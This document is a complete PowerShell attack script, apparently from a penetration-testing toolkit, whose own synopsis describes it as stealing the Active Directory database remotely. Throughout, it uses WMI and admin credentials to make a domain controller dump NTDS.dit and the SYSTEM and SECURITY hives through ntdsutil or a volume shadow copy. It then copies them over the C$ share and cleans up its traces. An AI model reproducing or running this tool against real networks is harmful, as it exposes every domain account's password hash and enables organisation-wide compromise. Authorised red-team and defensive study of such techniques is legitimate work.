<#
.SYNOPSIS
    Steal Active Directory database remotely.
	
    Author: Timothee MENOCHET (@synetis)

.DESCRIPTION
    Get-NTDSCopy makes a copy of the NTDS.dit file and related hives from a remote domain controller.
    The ntdsutil command is launch through WMI in case of Windows 2008 or later, otherwise WMI Volume Shadow Copy method is used.

.PARAMETER DomainController
    Specify the target domain controller.

.PARAMETER TargetDirectory
    Specify the target directory for local copy.

.PARAMETER Credential
    Specify the privileged account to use (typically Domain Admin).

.NOTES
    Get-NTDSCopy does NOT require PowerShell Remoting or WinRM to work and only uses Windows Management Instrumentation (WMI).

.EXAMPLE
    PS C:\> .\Get-NTDSCopy.ps1 -DomainController DC1.ADATUM.CORP

.EXAMPLE
    PS C:\> .\Get-NTDSCopy.ps1 -DomainController DC1.ADATUM.CORP -TargetDirectory C:\TEMP -Credential ADATUM\Administrator
#>

Param (
    [Parameter(Mandatory=$true)]
    [ValidateNotNullOrEmpty()]
    [String]
    $DomainController,

    [ValidateNotNullOrEmpty()]
    [String]
    $TargetDirectory = ".",

    [ValidateNotNullOrEmpty()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $Credential = [System.Management.Automation.PSCredential]::Empty
)

# Identify the operating system version
$OS = Get-WmiObject Win32_OperatingSystem -ComputerName $DomainController -Credential $Credential

# Map a drive to the domain controller and create a temporary directory
New-PSDrive -Name "S" -Root "\\$DomainController\c$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
New-Item -Path 'S:\Windows\Temp\dump' -ItemType directory | Out-Null

# If the operating system is Windows 2008 or later
If ($OS.Version[0] -ge 6)
{
    $Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList 'cmd.exe /c ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\dump" "quit" "quit"' -ComputerName $DomainController -Credential $Credential
    Do
    {
        Start-Sleep -m 250
    }
    Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $DomainController -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)

    # Copy the ntds.dit file and SYSTEM hive locally
    Copy-Item 'S:\Windows\Temp\dump\Active Directory\ntds.dit' $TargetDirectory
    Copy-Item 'S:\Windows\Temp\dump\registry\SECURITY' $TargetDirectory
    Copy-Item 'S:\Windows\Temp\dump\registry\SYSTEM' $TargetDirectory
}

# If the operating system is Windows 2003
Else
{
    # Grab the location of the ntds.dit file on the remote domain controller
    $Hive = [uint32]2147483650
    $Key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
    $Value = "DSA Database File"
    $DitPath = (Invoke-WmiMethod -Class StdRegProv -Name GetStringValue -ArgumentList $Hive, $Key, $Value -ComputerName $DomainController -Credential $Credential).sValue
    $DitDrive = $DitPath.Split("\")[0]
    $DitRelativePath = $DitPath.Split("\")[1..($DitPath.Split("\").Length - 2)] -Join "\"

    # Create a shadow copy of the corresponding drive
    $Process = Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'ClientAccessible',"$DitDrive\" -ComputerName $DomainController -Credential $Credential
    $ShadowCopy = Get-WmiObject -Class Win32_ShadowCopy -Property DeviceObject -Filter "ID = '$($Process.ShadowID)'" -ComputerName $DomainController -Credential $Credential
    $DeviceObject = $ShadowCopy.DeviceObject.ToString()

    # Copy the ntds.dit file and SYSTEM hive from the shadow copy
    $Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "cmd.exe /c for %I in ($DeviceObject\$DitRelativePath\ntds.dit $DeviceObject\$DitRelativePath\edb.log $DeviceObject\Windows\System32\config\SYSTEM $DeviceObject\Windows\System32\config\SECURITY) do copy %I C:\Windows\Temp\dump" -ComputerName $DomainController -Credential $Credential
    Do
    {
        Start-Sleep -m 250
    }
    Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $DomainController -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)

    # Delete the shadow copy
    (Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy -ComputerName $DomainController -Credential $Credential | Where-Object {$_.DeviceObject -eq $DeviceObject}).Delete()

    # Copy the ntds.dit file and SYSTEM hive locally
    Copy-Item 'S:\Windows\Temp\dump\ntds.dit' $TargetDirectory
    Copy-Item 'S:\Windows\Temp\dump\edb.log' $TargetDirectory
    Copy-Item 'S:\Windows\Temp\dump\SYSTEM' $TargetDirectory
    Copy-Item 'S:\Windows\Temp\dump\SECURITY' $TargetDirectory
}

# Delete the temporary directory
Remove-Item 'S:\Windows\Temp\dump' -Recurse
Remove-PSDrive S